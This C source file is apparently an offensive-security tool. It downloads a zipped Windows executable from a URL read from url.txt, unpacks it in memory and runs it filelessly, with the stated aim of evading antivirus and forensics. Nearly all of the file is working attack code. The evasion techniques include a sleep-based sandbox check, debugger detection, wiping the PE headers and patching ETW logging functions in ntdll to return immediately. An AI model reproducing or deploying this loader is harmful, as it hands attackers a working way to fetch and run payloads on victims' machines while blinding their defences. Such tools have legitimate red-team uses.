// =====================================================================================================================================================================
// 'Fileless-Remote-PE-Loader.c' enables direct in-memory execution of a x64 PE file (exe embeded in a zip file) retrieved from a remote web server.
// It downloads, decompresses (unzip), and loads offensive security executables without writing them to disk to evade static AV detection and reduce forensic footprint.
// Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
// =====================================================================================================================================================================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include "Winternl.h"
#pragma comment(lib, "wininet.lib")
#include "miniz.h"
#define BUFFER_SIZE 8192

// Structure to hold thread parameters
typedef struct {
    void *entryPoint;
    int argc;
    char **argv;
    BOOL is64Bit;
} ThreadParams;

// Dynamic API resolution
typedef LPVOID(WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

// Thread function to set up stack and call EXE entry point
DWORD WINAPI ExecuteEntryPoint(LPVOID lpParam) {
    ThreadParams *params = (ThreadParams *)lpParam;
    void *entryPoint = params->entryPoint;
    int argc = params->argc;
    char **argv = params->argv;
    BOOL is64Bit = params->is64Bit;

    if (is64Bit) {
        typedef int (*Main_t)(int, char **);
        Main_t mainFn = (Main_t)entryPoint;
        return mainFn(argc, argv);
    } else {
        typedef int (__cdecl *Main_t)(int, char **);
        Main_t mainFn = (Main_t)entryPoint;
        return mainFn(argc, argv);
    }
}

// Execute PE in memory
void ExecutePEInMemory(const char *peBuffer, SIZE_T peSize, int argc, char **argv) {
    IMAGE_DOS_HEADER *dosHeader = (IMAGE_DOS_HEADER *)peBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[!] Invalid DOS signature\n");
        return;
    }

    IMAGE_NT_HEADERS *ntHeaders = (IMAGE_NT_HEADERS *)((BYTE *)peBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[!] Invalid NT signature\n");
        return;
    }

    BOOL is64Bit = (ntHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
    ULONGLONG imageBasePreferred = is64Bit ?
        ((IMAGE_NT_HEADERS64 *)ntHeaders)->OptionalHeader.ImageBase :
        ((IMAGE_NT_HEADERS32 *)ntHeaders)->OptionalHeader.ImageBase;
    SIZE_T sizeOfImage = is64Bit ?
        ((IMAGE_NT_HEADERS64 *)ntHeaders)->OptionalHeader.SizeOfImage :
        ((IMAGE_NT_HEADERS32 *)ntHeaders)->OptionalHeader.SizeOfImage;
    DWORD addressOfEntryPoint = is64Bit ?
        ((IMAGE_NT_HEADERS64 *)ntHeaders)->OptionalHeader.AddressOfEntryPoint :
        ((IMAGE_NT_HEADERS32 *)ntHeaders)->OptionalHeader.AddressOfEntryPoint;

	// Resolve VirtualAlloc dynamically
	pVirtualAlloc VirtualAllocFn = (pVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
	LPVOID imageBase = VirtualAllocFn((LPVOID)imageBasePreferred, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!imageBase) {
        imageBase = VirtualAllocFn(NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!imageBase) {
            printf("[!] Failed to allocate memory: %lu\n", GetLastError());
            return;
        }
    }

    memcpy(imageBase, peBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
    // Erase PE headers for stealth
	ZeroMemory(imageBase, ntHeaders->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER *section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (BYTE *)imageBase + section[i].VirtualAddress;
        LPVOID src = (BYTE *)peBuffer + section[i].PointerToRawData;
        memcpy(dest, src, section[i].SizeOfRawData);
    }

    IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size) {
        IMAGE_IMPORT_DESCRIPTOR *importDesc = (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)imageBase + importDir.VirtualAddress);
        while (importDesc->Name) {
            LPCSTR dllName = (LPCSTR)((BYTE *)imageBase + importDesc->Name);
            HMODULE hModule = LoadLibraryA(dllName);
            if (!hModule) {
                printf("Failed to load DLL: %s\n", dllName);
                VirtualFree(imageBase, 0, MEM_RELEASE);
                return;
            }

            IMAGE_THUNK_DATA *thunk = (IMAGE_THUNK_DATA *)((BYTE *)imageBase + importDesc->FirstThunk);
            while (thunk->u1.AddressOfData) {
                IMAGE_IMPORT_BY_NAME *importByName = (IMAGE_IMPORT_BY_NAME *)((BYTE *)imageBase + thunk->u1.AddressOfData);
                thunk->u1.Function = (ULONGLONG)GetProcAddress(hModule, importByName->Name);
                thunk++;
            }
            importDesc++;
        }
    }

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        DWORD protect = PAGE_READONLY;
        if (section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) protect = PAGE_EXECUTE_READ;
        else if (section[i].Characteristics & IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;

        DWORD oldProtect;
        VirtualProtect((BYTE *)imageBase + section[i].VirtualAddress, section[i].SizeOfRawData, protect, &oldProtect);
    }

    ThreadParams params = {
        .entryPoint = (BYTE *)imageBase + addressOfEntryPoint,
        .argc = argc,
        .argv = argv,
        .is64Bit = is64Bit
    };

    HANDLE hThread = CreateThread(NULL, 0, ExecuteEntryPoint, &params, 0, NULL);
    if (!hThread) {
        printf("[!] Failed to create thread: %lu\n", GetLastError());
        VirtualFree(imageBase, 0, MEM_RELEASE);
        return;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}

// Downloads a ZIP file from URL into memory
BYTE *DownloadZipToMemory(const char *url, DWORD *zipSize) {
    BYTE *buffer = NULL;
    DWORD totalSize = 0;

    HINTERNET hInternet = InternetOpenA("ZipDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("[!] InternetOpenA failed.\n");
        return NULL;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        printf("[!] InternetOpenUrlA failed.\n");
        InternetCloseHandle(hInternet);
        return NULL;
    }

    BYTE temp[BUFFER_SIZE];
    DWORD bytesRead = 0;

    while (InternetReadFile(hFile, temp, BUFFER_SIZE, &bytesRead) && bytesRead > 0) {
        BYTE *newBuffer = (BYTE *)realloc(buffer, totalSize + bytesRead);
        if (!newBuffer) {
            printf("[!] Memory allocation failed.\n");
            free(buffer);
            InternetCloseHandle(hFile);
            InternetCloseHandle(hInternet);
            return NULL;
        }

        buffer = newBuffer;
        memcpy(buffer + totalSize, temp, bytesRead);
        totalSize += bytesRead;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    if (totalSize == 0) {
        printf("[!] Download failed or empty file.\n");
        free(buffer);
        return NULL;
    }

    *zipSize = totalSize;
    return buffer;
}

// Decompresses first file in ZIP buffer
BOOL DecompressZipBuffer(BYTE *zipBuffer, DWORD zipSize, BYTE **outBuffer, SIZE_T *outSize) {
    mz_zip_archive zip;
    memset(&zip, 0, sizeof(zip));

    if (!mz_zip_reader_init_mem(&zip, zipBuffer, zipSize, 0)) return FALSE;

    int fileCount = mz_zip_reader_get_num_files(&zip);
    if (fileCount == 0) {
        mz_zip_reader_end(&zip);
        return FALSE;
    }

    size_t extractedSize = 0;
    void *extracted = mz_zip_reader_extract_to_heap(&zip, 0, &extractedSize, 0);
    mz_zip_reader_end(&zip);

    if (!extracted) return FALSE;

    *outBuffer = (BYTE *)extracted;
    *outSize = extractedSize;
    return TRUE;
}

// Patches ETW functions in ntdll memory
BOOL PatchEtwFunctions() {
    const char *etwFunctions[] = {
        "EtwEventWrite",
        "EtwEventWriteEx",
        "EtwEventWriteFull",
        "EtwEventWriteTransfer"
    };

    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (!hNtDll) {
        printf("[!] Failed to get handle for ntdll.dll\n");
        return FALSE;
    }

    for (int i = 0; i < sizeof(etwFunctions) / sizeof(etwFunctions[0]); i++) {
        PBYTE pFunc = (PBYTE)GetProcAddress(hNtDll, etwFunctions[i]);
        if (!pFunc) {
            printf("[!] Failed to resolve %s\n", etwFunctions[i]);
            continue;
        }

        DWORD oldProtect;
        // Make memory writable (but not executable)
        if (!VirtualProtect(pFunc, 1, PAGE_READWRITE, &oldProtect)) {
            printf("[!] VirtualProtect failed for %s\n", etwFunctions[i]);
            continue;
        }

        // Patch first byte to RET
        *pFunc = 0xC3;

        // Restore original protection
        if (!VirtualProtect(pFunc, 1, oldProtect, &oldProtect)) {
            printf("[!] Failed to restore protection for %s\n", etwFunctions[i]);
        } else {
            //printf("[*] Patched %s\n", etwFunctions[i]);
        }
    }

    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("[*] No argument was provided. Press 'Enter' to continue, or press 'Ctrl+C' to exit and relaunch with arguments....\n", argv[0]);
	    getchar();
        //return 1;
    }
	
	//Basic Time-Based Sandbox Detection 
    DWORD start = GetTickCount();
    Sleep(5000);  // Sleep for 5 seconds
    DWORD end = GetTickCount();

    DWORD elapsed = end - start;
    printf("[*] Elapsed time: %lu ms\n", elapsed);

    if (elapsed < 4500) {
        printf("[!] Sandbox detected (sleep skipped or accelerated)\n");
		return 1;
	}
	else{
	//Basic Sandbox Detection - Checks if process is currently being debugged
		BOOL isDebugged = FALSE;
		CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
		if (isDebugged) {
			printf("[!] Debugger detected!\n");
			return 1;
		}
	printf("[*] SandBox checks completed.\n");
	}
	
	if (!PatchEtwFunctions())
	{
		printf("[!] ETW patching failed\n");
		return 1;
	}
	else
	{
		printf("[*] ETW patching completed.\n");
	}

    const char *filename = "url.txt";
    char url[1024];  

    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("[!] Failed to open url.txt");
        return 1;
    }

    if (fgets(url, sizeof(url), file) == NULL) {
        fprintf(stderr, "Failed to read from file\n");
        fclose(file);
        return 1;
    }

    // Remove newline character if present
    url[strcspn(url, "\n")] = 0;
    fclose(file);

    DWORD zipSize = 0;
    BYTE *zipData = DownloadZipToMemory(url, &zipSize);
    if (!zipData) {
        printf("[!] Download failed.\n");
        return 1;
    }
	printf("[*] File successfully downloaded.\n");

    BYTE *peBuffer = NULL;
    SIZE_T peSize = 0;

    if (!DecompressZipBuffer(zipData, zipSize, &peBuffer, &peSize)) {
        printf("[*] Decompression failed.\n");
        free(zipData);
        return 1;
    }
    free(zipData);

    int exeArgc = argc - 1;
    char **exeArgv = argv + 1;

    ExecutePEInMemory(peBuffer, peSize, argc, argv);
    free(peBuffer);
    return 0;
}
